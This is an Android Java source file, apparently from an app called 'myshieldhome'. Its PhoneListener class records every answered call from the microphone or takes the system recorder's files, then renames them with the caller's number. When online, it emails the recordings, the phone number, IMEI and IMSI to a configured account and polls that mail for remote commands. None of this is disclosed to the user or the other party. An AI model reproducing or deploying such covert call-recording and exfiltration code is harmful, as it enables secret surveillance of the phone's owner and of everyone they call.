package com.yangshuo.myshieldhome;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.media.MediaRecorder;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Build;
import android.os.Environment;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Comparator;
import java.util.Date;
import java.util.List;

/**
 * Created by yangshuo on 2018/1/4.
 */

public class PhoneListener extends PhoneStateListener {
    public String strLastCallName = "";
    public String strCallNumber = "";
    public String strLastCallTime = "";
    public int callStatus = TelephonyManager.CALL_STATE_IDLE;
    //声明录音机
    private MediaRecorder mediaRecorder = null;
    private boolean bMediaRecorderOn = false;
    private String strMailContent = "";
    private String strMailTitle = CommonParams.MAIL_TITLE_RECORD;
    private File sysRecordPath = null;
    private Context mContext = null;
    PhoneListener(Context context){
        mContext = context;
        sysRecordPath = CommonParams.path;
        getIMSI();
        if(CfgParamMgr.getInstance().getSysRecorderFlag())
        {
            if(CfgParamMgr.getInstance().getMachineType().equalsIgnoreCase(CommonParams.type360))
            {
                sysRecordPath = Environment.getExternalStoragePublicDirectory("360OS/My Records/Call Records");
            }
            else if(CfgParamMgr.getInstance().getMachineType().equalsIgnoreCase(CommonParams.typeX900))
            {
                sysRecordPath = Environment.getExternalStoragePublicDirectory("Recorder/remote");
            }
            else
            {
                sysRecordPath = Environment.getExternalStoragePublicDirectory("360OS/My Records/Call Records");
            }
        }
    }

    // 当电话的呼叫状态发生变化的时候调用的方法
    @Override
    public void onCallStateChanged(int state, String incomingNumber) {
        super.onCallStateChanged(state, incomingNumber);
        try {
            switch (state) {
                case TelephonyManager.CALL_STATE_IDLE://空闲状态。
                    if(CfgParamMgr.getInstance().getSysRecorderFlag()==false)
                    {
                        if(mediaRecorder!=null) {
                            //8.停止捕获
                            mediaRecorder.stop();
                            //9.释放资源
                            mediaRecorder.release();
                            mediaRecorder = null;
                        }
                    }
                    if(bMediaRecorderOn == true){
                        bMediaRecorderOn = false;
                        String strLastCallNewName = "";
                        //自己录音已完成,需要改名
                        if(CfgParamMgr.getInstance().getSysRecorderFlag()==false)
                        {
                            if(strLastCallName.isEmpty()==false)
                            {
                                //改变文件名
                                File file = new File(CommonParams.path, strLastCallName);
                                if(file.exists())
                                {
//   									printTimeLog("2");
                                    strLastCallNewName = strLastCallTime + strCallNumber + ".aac";
                                    file.renameTo(new File(CommonParams.path, strLastCallNewName));
                                    strLastCallName = "";
                                    strLastCallTime = "";
                                    strCallNumber = "";
                                }
                            }
                        }
                        else
                        {
                            strLastCallNewName = strLastCallTime + strCallNumber + ".amr";
                            strLastCallName = "";
                            strLastCallTime = "";
                            strCallNumber = "";
                        }
                        callStatus = TelephonyManager.CALL_STATE_IDLE;
                        //将录制完毕的音频文件发送
                        if(true==isNetworkConnected(mContext))//getApplicationContext()
                        {
                            if(strLastCallNewName.isEmpty()==false)
                            {
                                if(CfgParamMgr.getInstance().getSysRecorderFlag())
                                {   //等待1秒让系统录音机结束
                                    try{
                                        Thread.sleep(1000);//wait()不会阻塞
                                    }catch (Exception e) {
                                    }
                                }
                                File[] filesSYS = new File(sysRecordPath.getAbsolutePath()).listFiles();
                                Arrays.sort(filesSYS, new Comparator<File>() {
                                    public int compare(File f1, File f2) {
                                        long diff = f1.lastModified() - f2.lastModified();
                                        if (diff > 0)
                                            return -1;
                                        else if (diff == 0)
                                            return 0;
                                        else
                                            return 1;//如果 if 中修改为 返回1 同时此处修改为返回 -1  排序就会是递增
                                    }
                                    public boolean equals(Object obj) {
                                        return true;
                                    }
                                });
                                int idxfile= 0;
                                for (File file : filesSYS) {
                                    if(file.isFile())//文件.nomedia必须带上，否则发不出来
                                    {
                                        /*以下代码需要测试
                                        if(file.isFile()&&file.getName().equals(".nomedia")) {
                                            file.delete();
                                        }
                                        */
                                        if(idxfile==0)
                                        {//最新的文件,挪到自有路径下,并改为正确的名称
                                            if(CfgParamMgr.getInstance().getSysRecorderFlag())
                                            {
                                                file.renameTo(new File(CommonParams.path, strLastCallNewName));
                                            }
                                            else
                                            {
                                                if(CommonParams.path.compareTo(sysRecordPath)!=0)
                                                {
                                                    file.renameTo(new File(CommonParams.path, file.getName()));
                                                }
                                            }
                                            idxfile=1;
                                        }
                                        else
                                        {//其余文件挪到自有路径下,不改名
                                            if(CommonParams.path.compareTo(sysRecordPath)!=0)
                                            {
                                                file.renameTo(new File(CommonParams.path, file.getName()));
                                            }
                                        }
                                    }
                                }
                                List<String> pathList = new ArrayList<String>();
                                String strCallContent  = "<br>";
                                boolean bHasFile = false;
                                File[] files = new File(CommonParams.path.getAbsolutePath()).listFiles();
                                for (File file : files) {
                                    if(file.getName().endsWith(CommonParams.pendingListName)||file.getName().endsWith(CommonParams.cfgFileName)
                                            ||file.getName().endsWith(CommonParams.GPSinfoFileName)||file.getName().endsWith(CommonParams.GPSinfoPendingListName))
                                    {
                                        continue;
                                    }
                                    if(file.isFile()) {
                                        pathList.add(CommonParams.path.getAbsolutePath() + File.separator + file.getName());
                                        strCallContent += "<br>file:" + CommonParams.path.getAbsolutePath() + File.separator + file.getName();
                                        if(file.getName().endsWith(".nomedia")==false)
                                        {
                                            bHasFile = true;
                                        }
                                    }
                                }
                                if(bHasFile==false)
                                {
                                    strCallContent += "<br>电话未接通,没录上";
                                }
                                strCallContent += "<br>Call Record:"+strLastCallNewName;
                                // 如果接受过更新设备名称的指令，那么在这里更新，确保设备名称正确显示
                                strMailTitle = strMailTitle.replaceAll(CommonParams.deviceName, CfgParamMgr.getInstance().getMachineName());
                                strMailContent = strMailContent.replaceAll(CommonParams.deviceName, CfgParamMgr.getInstance().getMachineName());
                                MailManager.getInstance().sendMailWithMultiFile(strMailTitle+ ".时间"+strLastCallNewName, strMailContent+strCallContent, pathList);
                                if(CfgParamMgr.getInstance().getGPSserviceFlag()==false)
                                {
                                    //如果没开GPS，需要检查命令。如果GPS已经开着，每次上报时会检查命令
                                    MailManager.getInstance().receiveCommandMail();
                                }
                                strLastCallNewName = "";
                                //加入清除名单
                                try {
                                    File file = new File(CommonParams.path, CommonParams.pendingListName);
                                    OutputStream fos = new FileOutputStream(file);
                                    OutputStreamWriter osw=new OutputStreamWriter(fos);
                                    for(int i=0;i<pathList.size();i++)
                                    {
                                        osw.write(pathList.get(i));
                                        osw.write("\r\n");
                                    }
                                    osw.flush();
                                    osw.close();
                                    fos.close();
                                } catch (IOException e) {
                                }
                            }
                        }
                        Log.i("SystemService", "音频文件录制完毕，可以在后台上传到服务器");
                    }
                    break;
                case TelephonyManager.CALL_STATE_RINGING://铃响状态。
                    if(callStatus==TelephonyManager.CALL_STATE_IDLE)
                    {
                        //前一个电话已经挂断,允许创建新的文件
                        callStatus = TelephonyManager.CALL_STATE_RINGING;
                    }
                    if(incomingNumber != null)
                    {
                        if(incomingNumber.length()>=2)
                        {
                            strCallNumber += "."+incomingNumber+".in";
                        }
                    }

                    break;
                case TelephonyManager.CALL_STATE_OFFHOOK://通话状态
                    if(callStatus==TelephonyManager.CALL_STATE_OFFHOOK)
                    {
                        //前一个电话还没挂断,不要创建新的文件
                        break;
                    }
                    //前一个电话已经挂断,开始录音
                    //1.指定录音文件的名称
                    strLastCallTime = CfgParamMgr.getInstance().getCurrentTime();
                    strLastCallName = strLastCallTime+strCallNumber+".aac";
                    if(CfgParamMgr.getInstance().getSysRecorderFlag()==false)
                    {
                        //2.实例化一个录音机
                        mediaRecorder = new MediaRecorder();
                        //3.指定录音机的声音源
                        mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                        //4.设置录制的文件输出的格式
                        //手机支持AMR_WB,AMR_NB,AAC,电脑只支持AMR_NB,AAC
//						mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.AMR_NB);
                        mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.AAC_ADTS);
                        File file = new File(CommonParams.path, strLastCallName);
                        mediaRecorder.setOutputFile(file.getAbsolutePath());
                        //5.设置音频的编码
                        //手机支持AMR_WB,AMR_NB,AAC,电脑只支持AMR_NB,AAC
//						mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
                        mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
                        //6.准备开始录音
                        mediaRecorder.prepare();
                        //7.开始录音
                        mediaRecorder.start();
                    }
                    bMediaRecorderOn = true;
                    callStatus = TelephonyManager.CALL_STATE_OFFHOOK;
                    break;
                default:
                    break;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    public boolean isNetworkConnected(Context context) {
        if (context != null) {
            ConnectivityManager mConnectivityManager = (ConnectivityManager) context
                    .getSystemService(Context.CONNECTIVITY_SERVICE);
            NetworkInfo mNetworkInfo = mConnectivityManager.getActiveNetworkInfo();
            if (mNetworkInfo != null) {
                return mNetworkInfo.isAvailable();
            }
        }
        return false;
    }

    public void sendOnlineNotify(){
        boolean bIsSendNotify =  true;
        long curDateMillis = System.currentTimeMillis();
        if(CfgParamMgr.getInstance().reportDate == 0)
        {
            CfgParamMgr.getInstance().reportDate = curDateMillis;
        }
        else
        {
            if(curDateMillis - CfgParamMgr.getInstance().reportDate <= 1000 * 60 * 10)// 10分钟
            {
                bIsSendNotify = false;
            }
            else
            {
                CfgParamMgr.getInstance().reportDate = curDateMillis;
            }
        }
        if(bIsSendNotify)
        {
            MailManager.getInstance().sendMail(CommonParams.MAIL_TITLE_NOTIFY+strMailTitle, CfgParamMgr.getInstance().getCurrentTime()+"<br>"+strMailContent);
        }
    }
    private void getIMSI() {
        strMailTitle += ".设备ID." + CfgParamMgr.getInstance().getDeviceID();
        strMailContent += "设备ID." + CfgParamMgr.getInstance().getDeviceID();
        strMailTitle += "."+CfgParamMgr.getInstance().getMachineName();
        strMailContent += "<br>"+CfgParamMgr.getInstance().getMachineName();

        strMailContent += "<br>PhoneNumber:" + CfgParamMgr.getInstance().getPhoneNumber();//获取本机号码
        strMailContent += "<br>IMEI:" + CfgParamMgr.getInstance().getIMEI();//获得SIM卡的序号
        String IMSI = CfgParamMgr.getInstance().getIMSI();//得到用户Id
        // IMSI号前面3位460是国家，紧接着后面2位00 02是中国移动，01是中国联通，03是中国电信。
        if (IMSI.startsWith("46000") || IMSI.startsWith("46002")) {
            strMailContent += "<br>IMSI:中国移动" + IMSI;
        } else if (IMSI.startsWith("46001")) {
            strMailContent += "<br>IMSI:中国联通" + IMSI;
        } else if (IMSI.startsWith("46003")) {
            strMailContent += "<br>IMSI:中国电信" + IMSI;
        }
        else
        {
            strMailContent += "<br>IMSI:" + IMSI;
        }
    }
}
